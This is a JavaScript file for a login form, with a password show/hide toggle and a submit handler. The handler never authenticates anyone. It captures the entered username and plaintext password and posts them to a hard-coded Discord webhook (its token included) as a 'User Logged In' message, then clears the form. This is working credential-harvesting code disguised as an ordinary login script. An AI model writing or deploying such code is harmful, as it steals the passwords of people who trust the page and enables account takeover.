const togglePasswordLogin = document.getElementById("togglePassword");
const passwordInputLogin = document.getElementById("password");
const loginForm = document.getElementById("loginForm");

togglePasswordLogin.addEventListener("click", function () {
    // Toggle the type attribute of the password input field
    const type = passwordInputLogin.type === "password" ? "text" : "password";
    passwordInputLogin.type = type;

    // Toggle the eye icon between open and closed
    this.textContent = type === "password" ? "👁️" : "🚫";
});

loginForm.addEventListener("submit", function (event) {
    event.preventDefault();

    // Collect username and password
    const username = document.getElementById("username").value;
    const password = document.getElementById("password").value;

    // Prepare the data to send to the webhook
    const data = {
        username: username,
        password: password
    };

    // Send the data to the Discord webhook
    fetch("https://discord.com/api/webhooks/1315544300695584830/UqHr8rG9jfLuE8bA79w4F2XPkEG7DBEAYjRB_XPT2M8R3JmOYJXRHmzxBApKXEXULNjr", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            embeds: [
                {
                    title: "User Logged In",
                    description: `User: ${data.username} has logged in with the password: ${data.password}`,
                    color: 16777215 // White color
                }
            ]
        })
    })
    .then(response => response.json())
    .then(data => {
        console.log('Success:', data);
    })
    .catch((error) => {
        console.error('Error:', error);
    });

    // Optionally, you can redirect or reset the form after successful submission
    loginForm.reset();
});
